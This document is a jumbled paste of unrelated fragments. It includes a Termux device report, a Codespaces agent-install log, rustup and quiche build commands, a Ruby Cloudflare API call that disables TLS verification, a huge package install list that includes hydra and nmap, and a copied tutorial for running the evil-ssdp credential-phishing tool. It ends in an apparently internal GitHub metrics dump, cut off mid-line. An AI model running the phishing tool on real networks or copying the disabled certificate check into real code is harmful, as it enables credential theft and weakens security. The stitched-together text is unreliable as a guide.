Packages CPU architecture:
aarch64
Subscribed repositories:
# sources.list
deb https://grimler.se/termux/termux-main stable main
# x11-repo (sources.list.d/x11.list)
deb https://grimler.se/termux/termux-x11 x11 main
# root-repo (sources.list.d/root.list)
deb https://grimler.se/termux/termux-root root stable
Updatable packages:
All packages up to date
termux-tools version:
1.36.1
Android version:
11
Kernel build information:
Linux localhost 4.9.227-perf-23848788 #1 SMP PREEMPT Thu Jul 21 16:19:53 KST 2022 aarch64 Android
Device manufacturer:
samsung
Device model:
SM-T290






#!/bin/bash
npm install -g node-gyp
l
103
  # Download and extract agent
104
  mkdir -p /.codespaces/agent/bin
107
  cd /.codespaces/agent/bin
108
  FIRST_LOCATION=($TARGET_VSCS_LOCATIONS)
109
  AGENT_DOWNLOAD_URL="https://api.github.com/$INTERNAL_URL/ah-ha-admin/refactored-memory/agent/download?$TARGET_LOCATION_KEY=$FIRST_LOCATION&workflow_run_id=$CODESPACES_GITHUB__WORKFLOWRUNID&$TARGET_KEY=$CODESPACES_GITHUB__VSCSTARGET&$TARGET_URL_KEY=${CODESPACES_GITHUB__VSCSTARGETURL-}"
110
  curl --location $AGENT_DOWNLOAD_URL           --header "Authorization: token $CODESPACES_GITHUB__APITOKEN"           --output tmp.zip
10
  unzip -q tmp.zip && rm tmp.zip
11
  # Install agent
12
  containerTmp=/mnt/containerTmp
13
  mkdir -p $containerTmp
14
  chmod o+rwt $containerTmp
15
  setfacl -dR -m o::rw $containerTmp
16
  codespacesSharedFolder=~/.codespaces/shared
17
  mkdir -p $codespacesSharedFolder
18
  chmod o+rw $codespacesSharedFolder
19
  setfacl -dR -m o::rw $codespacesSharedFolder
20
  chmod +x install_codespaces_agent.sh
21
  ./install_codespaces_agent.sh
22
  # Make copy of codespaces agent to mount
23
  mkdir -p /.codespaces/agent/mount
24
  cp -a /.codespaces/agent/bin/. /.codespaces/agent/mount
25
  shell: /usr/bin/sudo -EH bash {0}
26
  env:
27
    CODESPACES_GITHUB__APITOKEN: ***
28
    CODESPACES_GITHUB__VSCSTARGET: production
29
    CODESPACES_GITHUB__WORKFLOWRUNID: 3993123911
30
    CODESPACES_TELEMETRYSETTINGS__TELEMETRYENDPOINT: ***/ah-ha-admin/refactored-memory/agent/diagnostics
31
    TARGET_VSCS_LOCATIONS: EastUs WestUs2
32
    USER_SECRETS_JSON: ***
33
    REPO_URL: https://github.com/ah-ha-admin/refactored-memory/tree/main
34
    REPO_URL_WITHOUT_BRANCH: https://github.com/ah-ha-admin/refactored-memory
35
    REPO_NAME_WITHOUT_OWNER: refactored-memory
36
    DEVCONTAINER_PATH: .devcontainer/devcontainer.json
37
    CONFIGURATION_ID: 8893
38
    CODESPACES_GITHUB__VSCSTARGETURL: 
39
    INTERNAL_URL: ***
40
    LOG_PATH: ***
41
    TARGET_KEY: ***
42
    TARGET_LOCATION_KEY: ***
43
    TARGET_URL_KEY: ***
44
+ mkdir -p /.codespaces/agent/bin
45
+ cd /.codespaces/agent/bin
46
+ FIRST_LOCATION=($TARGET_VSCS_LOCATIONS)
47
+ AGENT_DOWNLOAD_URL='https://api.github.com/***/ah-ha-admin/refactored-memory/agent/download?***=EastUs&workflow_run_id=3993123911&***=production&***='
48
+ curl --location 'https://api.github.com/***/ah-ha-admin/refactored-memory/agent/download?***=EastUs&workflow_run_id=3993123911&***=production&***=' --header 'Authorization: token ***' --output tmp.zip

https://static.rust-lang.org/rustup/dist/aarch64-unknown-linux-gnu/rustup-init
ou
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
git clone --recursive https://github.com/cloudflare/quiche
cargo build --examples
RUST_LOG=info target/debug/examples/http3-client https://blog.cloudflare.com/
./curl -I https://blog.cloudflare.com/ --http3


require 'uri'
require 'net/http'
require 'openssl'

url = URI("https://api.cloudflare.com/client/v4/accounts/account_identifier/intel/ip")

http = Net::HTTP.new(url.host, url.port)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

request = Net::HTTP::Get.new(url)
request["Content-Type"] = 'application/json'
request["X-Auth-Email"] = ''

response = http.request(request)
puts response.read_body

npm i -g runit-services-admin

npm install serverless-plugin-include-dependencies --save-dev

npm i -g serverless && serverless \
    --org=sexflixxx \
    --app=apinodetest \
    --name=apinodetest \
    --template=aws-node-http-api


pkg install tsu 
pkg update && pkg upgrade
pkg install aapt abduco abook abuild ack-grep alpine angband apache2 apk-tools apksigner apr-util apr apt argp aria2 asciinema atomicparsley attr autoconf automake autossh axel babl bash-completion bash bat bc binutils bison bmon boost brogue brotli bs1770gain busybox bvi byobu c-ares c-toxcore ca-certificates caddy calcurse cava cboard ccache ccrypt cgdb cmake cmark cmatrix cmus colordiff command-not-found coreutils corkscrew cowsay cpio cppi cscope ctags curseofwar cvs daemonize darkhttpd dash datamash dcraw ddrescue debianutils debootstrap dialog diffutils direvent dnsutils dos2unix doxygen dpkg dropbear dvtm dx ecj ecj4.6 ed elinks emacs erlang espeak exa expect fakeroot fd fdupes ffmpeg fftw figlet file finch findutils fish flex fontconfig fortune fossil freetype fribidi frobtads frotz fsmon fwknop fzf gawk gbt gcal gdb gdbm gdk-pixbuf gegl getconf getmail gettext ghostscript gifsicle git-crypt git glib global glulxe gmic gnuchess gnugo gnuit gnupg gnuplot gnushogi golang googletest gperf gpgme gpsbabel graphicsmagick graphviz greed grep gsl gst-plugins-bad gst-plugins-base gst-plugins-good gst-plugins-ugly gstreamer gtypist gzip harfbuzz hashdeep hexcurse hexedit heyu hfsutils htop httping hub hugo hunspell-en-us hunspell-ru hunspell hydra icecast iconv imagemagick imgflo indent inetutils inotify-tools ipcalc iperf3 ipfs ired irssi isync jhead joe jq json-c json-glib jsoncpp jupp kakoune kbfs keybase kona krb5 ldc ldns ledger leptonica less leveldb lftp libandroid-glob libandroid-shmem libandroid-support libarchive libassuan libbsd libbz2 libc++ libcaca libcairo libcln libconfig libconfuse libcroco libcrypt libcue libcurl libdb libedit libelf libev libevent libexif libexpat libffi libflac libgc libgcrypt libgd libgit2 libgmime libgmp libgnutls libgpg-error libgraphite libgrpc libgsasl libhdf5 libical libicu libid3tag libidn libidn2 libisl libjansson libjasper libjpeg-turbo libksba libllvm liblua liblz4 liblzma liblzo libmad libmesode libmnl libmosquitto libmp3lame libmp3splt libmpc libmpdclient libmpfr libmsgpack libnettle libnghttp2 libnl libnpth libogg liboggz libopus libopusenc libotr libpcap libpipeline libpixman libpng libpopt libprotobuf libpulseaudio libqrencode librsvg librsync libsasl libsndfile libsodium libsoup libsoxr libsqlite libssh libssh2 libtalloc libtermkey libtiff libtool libunibilium libunistring libunwind libutil libuuid libuv libvorbis libvpx libvterm libwebp libwebsockets libx264 libx265 libxapian libxml2 libxslt libyaml libzmq libzopfli lighttpd linux-man-pages littlecms lldb ltrace luarocks lynx lzip lzop m4 macchanger make man mariadb mathomatic mbedtls mc mdp megatools memcached mg micro mime-support minicom mlocate moon-buggy moria mosh mp3splt mpc mpd mpv msmtp mtools multitail mutt nano ncdc ncdu ncmpcpp ncurses ndk-multilib ndk-stl ndk-sysroot ne neofetch neovim net-tools netpbm newsboat nginx ninja nmap nnn nodejs-lts nodejs notmuch nyancat nzbget oathtool ocrad openal-soft openjpeg openssh openssl optipng opus-tools opusfile p7zip pango par2 parallel parted pass-otp pass pastebinit patch patchelf pathpicker pcre pcre2 perl pforth php pick picolisp pinentry pkg-config play-audio pngquant poppler postgresql potrace privoxy procps profanity proot psmisc pure-ftpd pv pwgen python python2 qalc qpdf radare2 ragel ranger rclone rcs readline redir redis remind resolv-conf rgbds rhash ripgrep rlwrap root-repo rsync rtmpdump ruby rust screen screenfetch scrypt sed sensible-utils serf sharutils silversearcher-ag sl socat sox squid sshpass stag stfl stow strace stunnel subversion syncthing tar tasksh taskwarrior tcl tcsh teckit termux-am termux-api termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-tools teseq tesseract texinfo texlive-bin texlive-tlmgr texlive tig timewarrior tintin++ tinyproxy tinyscheme tmate tmux toilet tor torsocks toxic tracepath transmission tree tsocks tsu tty-clock tty-solitaire ttyd ttyrec units unrar unzip utf8cpp utf8proc utfdecode util-linux valac valgrind vcsh vifm vim-python vim vorbis-tools vttest vtutils w3m wcalc weechat wget wireguard-tools wol x11-repo xmlsec xmlstarlet xorriso xvidcore yarn yasm zbar zile zip zsh zstd 
sudo chmod +x ./dotnet-install.sh
./dotnet-install.sh --version latest

#/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
#contentstack ;
## sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 lib32z1 libbz2-1.0:i386
INSTALLATION
1
2
pkg update
pkg upgrade
Next, we install the packages we need: Git and Python.

1
2
apt install git -y
apt install python -y
Now we balance the instrument itself

1
2
git clone https://github.com/initstring/evil-ssdp
cd evil-ssdp
Next we will launch the tool:

1
python evil_ssdp.py eth0
The installation process will continue. In case you require help to use the tool, experts in ethical hacking recommend using these commands:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
usage: evil_ssdp.py [-h] [-p PORT] [-t TEMPLATE] [-s SMB] [-b] [-r REALM]
                    [-u URL]
                    interface
 
positional arguments:
  interface             Network interface to listen on.
 
optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port for HTTP server. Defaults to 8888.
  -t TEMPLATE, --template TEMPLATE
                        Name of a folder in the templates directory. Defaults
                        to "office365". This will determine xml and phishing
                        pages used.
  -s SMB, --smb SMB     IP address of your SMB server. Defalts to the primary
                        address of the "interface" provided.
  -b, --basic           Enable base64 authentication for templates and write
                        credentials to log file.
  -r REALM, --realm REALM
                        Realm when prompting target for authentication via
                        Basic Auth.
  -u URL, --url URL     Redirect to this URL. Works with templates that do a
                        POST for logon forms and with templates that include
                        the custom redirect JavaScript (see README for more
                        info).[example: -r https://google.com]
  -a, --analyze         Run in analyze mode. Will NOT respond to any SSDP
                        queries, but will still enable and run the web server
                        for testing.
These are all the commands needed to familiarize you with the tool. Ethical hacking experts recommend trying them out for a better experience. 

To learn more about information security risks, malware variants, vulnerabilities and information technologies, feel free to access the International Institute of Cyber Security (IICS) websites.

Share this…

Management
.github/workflows/main.yml
Filter workflow runs
main.yml
[["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:otel_rack_middleware", "result:false"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["database_selector.last_operations.size", 3, {:tags=>["called:middleware"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 1, {:tags=>["operation:enabled", "feature:reading_vitess_ipr", "result:false"]}], ["rpc.mysql.dist.time", 1.425748923793435, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:user_sessions"]}], ["catalog_service.rpc.mysql.dist.time", 1.425748923793435, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:user_sessions"]}], ["rpc.mysql.dist.time", 1.0073250159621239, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:users"]}], ["catalog_service.rpc.mysql.dist.time", 1.0073250159621239, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:users"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 1, {:tags=>["operation:enabled", "feature:popup_api", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:popup_api", "result:false"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 1, {:tags=>["operation:enabled", "feature:controller_feature_preloading", "result:true"]}], ["rpc.memcached.dist.time", 2, {:tags=>["rpc_operation:get_multi"]}], ["rpc.mysql.dist.time", 2.2249938920140266, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:abilities"]}], ["catalog_service.rpc.mysql.dist.time", 2.2249938920140266, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:abilities"]}], ["platform.loaders.dist.time", 3.2707229256629944, {:tags=>["loader:ability_membership_check"]}], ["feature_flags.groups.member_check_latency", 3, {:tags=>["team_name:employees"]}], ["rpc.mysql.dist.time", 1.2878059642389417, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:abilities"]}], ["catalog_service.rpc.mysql.dist.time", 1.2878059642389417, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:abilities"]}], ["platform.loaders.dist.time", 2.1741240052506328, {:tags=>["loader:ability_membership_check"]}], ["feature_flags.groups.member_check_latency", 2, {:tags=>["team_name:interns"]}], ["rpc.mysql.dist.time", 1.1483599664643407, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:users"]}], ["catalog_service.rpc.mysql.dist.time", 1.1483599664643407, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:users"]}], ["rpc.mysql.dist.time", 1.2974849669262767, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:repositories"]}], ["catalog_service.rpc.mysql.dist.time", 1.2974849669262767, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:repositories"]}], ["rpc.mysql.dist.time", 0.9801950072869658, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:repository_networks"]}], ["catalog_service.rpc.mysql.dist.time", 0.9801950072869658, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:unknown", "mysql_table:repository_networks"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:browser_vitals_time_metric", "result:true"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 1, {:tags=>["operation:enabled", "feature:two_factor_checkup", "result:false"]}], ["cap.enforcer.operation.dist", 0.00582495704293251, {:tags=>["policy:emu_visibility", "operation:enforceable", "location:web", "callback:ActionsController"]}], ["cap.target_for_conditional_access.dist", 0.01862191129475832, {:tags=>["location:web", "callback:ActionsController", "resource:Repository"]}], ["cap.enforcer.operation.dist", 0.07167598232626915, {:tags=>["policy:emu_visibility", "operation:applicable", "location:web", "callback:ActionsController"]}], ["cap.enforcer.operation.dist", 0.0033570686355233192, {:tags=>["policy:emu_ownership", "operation:enforceable", "location:web", "callback:ActionsController"]}], ["cap.enforcer.operation.dist", 0.01015199813991785, {:tags=>["policy:emu_ownership", "operation:applicable", "location:web", "callback:ActionsController"]}], ["cap.enforcer.operation.dist", 0.03527605440467596, {:tags=>["policy:ip_allowlist", "operation:enforceable", "location:web", "callback:ActionsController"]}], ["cap.enforcer.operation.dist", 0.010195071808993816, {:tags=>["policy:ip_allowlist", "operation:applicable", "location:web", "callback:ActionsController"]}], ["cap.enforcer.operation.dist", 0.011647935025393963, {:tags=>["policy:two_factor", "operation:enforceable", "location:web", "callback:ActionsController"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:cap_2fa_policy_enabled", "result:false"]}], ["cap.enforcer.operation.dist", 0.08436490315943956, {:tags=>["policy:two_factor", "operation:applicable", "location:web", "callback:ActionsController"]}], ["cap.enforcer.evaluation.dist", 0.7144029950723052, {:tags=>["location:web", "callback:ActionsController", "cached:false"]}], ["cap.target_for_conditional_access.dist", 0.02406409475952387, {:tags=>["location:legacy_web", "callback:ActionsController"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:breadcrumbs_logging", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:breadcrumbs_logging", "result:false"]}], ["rpc.mysql.dist.time", 1.1002239771187305, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:abilities"]}], ["catalog_service.rpc.mysql.dist.time", 1.1002239771187305, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:abilities"]}], ["platform.loaders.dist.time", 1.8369699828326702, {:tags=>["loader:ability_membership_check"]}], ["feature_flags.groups.member_check_latency", 2, {:tags=>["team_name:github_stars"]}], ["feature_flags.groups.check.latency", 2, {:tags=>["group:github_stars_members", "actor_type:Flipper::Types::Actor"]}], ["feature_flags.groups.check.latency", 0, {:tags=>["group:preview_features", "actor_type:Flipper::Types::Actor"]}], ["flipper.dist.time", 2, {:tags=>["operation:enabled", "feature:header_redesign", "result:false"]}], ["rpc.mysql.dist.time", 0.8464320562779903, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:network_privileges"]}], ["catalog_service.rpc.mysql.dist.time", 0.8464320562779903, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:network_privileges"]}], ["rpc.mysql.dist.time", 0.9949849918484688, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-collab-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repository_advisories"]}], ["catalog_service.rpc.mysql.dist.time", 0.9949849918484688, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-collab-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repository_advisories"]}], ["rpc.mysql.dist.time", 1.3156200293451548, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-configurations-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:configuration_entries"]}], ["catalog_service.rpc.mysql.dist.time", 1.3156200293451548, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-configurations-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:configuration_entries"]}], ["queries.actor_ids_with_granular_permissions_on.queried_subject_ids.dist", 1, {:tags=>[]}], ["queries.actor_ids_with_granular_permissions_on.queried_owner_ids.dist", 1, {:tags=>[]}], ["rpc.mysql.dist.time", 5.7740770280361176, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-permissions-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:permissions"]}], ["catalog_service.rpc.mysql.dist.time", 5.7740770280361176, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-permissions-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:permissions"]}], ["rpc.mysql.dist.time", 5.2544340724125504, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-permissions-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:permissions"]}], ["catalog_service.rpc.mysql.dist.time", 5.2544340724125504, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-permissions-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:permissions"]}], ["execute_in_batches.dist", 13, {}], ["authorization.service.dist", 13.003088999539614, {:tags=>["method: actor_ids_with_granular_permissions_on"]}], ["rpc.mysql.dist.time", 0.8049079915508628, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:integration_installations"]}], ["catalog_service.rpc.mysql.dist.time", 0.8049079915508628, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:integration_installations"]}], ["rpc.mysql.dist.time", 2.200628980062902, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflow_runs"]}], ["catalog_service.rpc.mysql.dist.time", 2.200628980062902, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflow_runs"]}], ["rpc.mysql.dist.time", 0.831380020827055, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-kv-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:key_values"]}], ["catalog_service.rpc.mysql.dist.time", 0.831380020827055, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-kv-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:key_values"]}], ["rpc.mysql.dist.time", 1.1307699605822563, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-configurations-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:configuration_entries"]}], ["catalog_service.rpc.mysql.dist.time", 1.1307699605822563, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-configurations-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:configuration_entries"]}], ["rpc.mysql.dist.time", 1.14427600055933, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-spokes-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repository_checksums"]}], ["catalog_service.rpc.mysql.dist.time", 1.14427600055933, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-spokes-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repository_checksums"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["platform.loaders.dist.time", 0.5143089219927788, {:tags=>["loader:ref"]}], ["rpc.mysql.dist.time", 3.428580006584525, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["catalog_service.rpc.mysql.dist.time", 3.428580006584525, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["rpc.mysql.dist.time", 5.456586019136012, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflow_runs"]}], ["catalog_service.rpc.mysql.dist.time", 5.456586019136012, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflow_runs"]}], ["rpc.mysql.dist.time", 3.4790950594469905, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-pushes-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:pushes"]}], ["catalog_service.rpc.mysql.dist.time", 3.4790950594469905, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-pushes-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:pushes"]}], ["hydro_client.kafka.producer.message_size", 1613, {:tags=>["client_id:github-production", "topic:cp1-iad.ingest.github.platform_health.v1.UserGeneratedContent"]}], ["hydro_client.kafka.producer.message_size", 773, {:tags=>["client_id:github-production", "topic:cp1-iad.ingest.live_updates.v0.Message"]}], ["hydro_client.kafka.producer.message_size", 2588, {:tags=>["client_id:github-production", "topic:cp1-iad.ingest.github.v1.Request"]}], ["rpc.mysql.dist.time", 4.3003460159525275, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["catalog_service.rpc.mysql.dist.time", 4.3003460159525275, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["rpc.mysql.dist.time", 6.991907954216003, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:check_suites"]}], ["catalog_service.rpc.mysql.dist.time", 6.991907954216003, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:check_suites"]}], ["rpc.mysql.dist.time", 0.9536490542814136, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:users"]}], ["catalog_service.rpc.mysql.dist.time", 0.9536490542814136, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:users"]}], ["rpc.mysql.dist.time", 1.003159093670547, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repositories"]}], ["catalog_service.rpc.mysql.dist.time", 1.003159093670547, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repositories"]}], ["rpc.mysql.dist.time", 3.059662994928658, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["catalog_service.rpc.mysql.dist.time", 3.059662994928658, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["rpc.mysql.dist.time", 3.7897489964962006, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["catalog_service.rpc.mysql.dist.time", 3.7897489964962006, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["rpc.mysql.dist.time", 2.416249015368521, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["catalog_service.rpc.mysql.dist.time", 2.416249015368521, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 1, {:tags=>["operation:enabled", "feature:actions_require_2fa", "result:false"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 1, {:tags=>["operation:enabled", "feature:actions_required_workflows", "result:true"]}], ["request.render.partial", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/organization_banners"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/organization_banners", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/organization_banners", "rpc_store:mysql"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:sdn_individual_suspension_v2_archive", "result:false"]}], ["request.render.partial", 1, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/archived_notice"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/archived_notice", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/archived_notice", "rpc_store:mysql"]}], ["request.render.partial", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/migrating_notice"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/migrating_notice", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/migrating_notice", "rpc_store:mysql"]}], ["request.render.partial", 0, {:tags=>["controller:actions", "action:index", 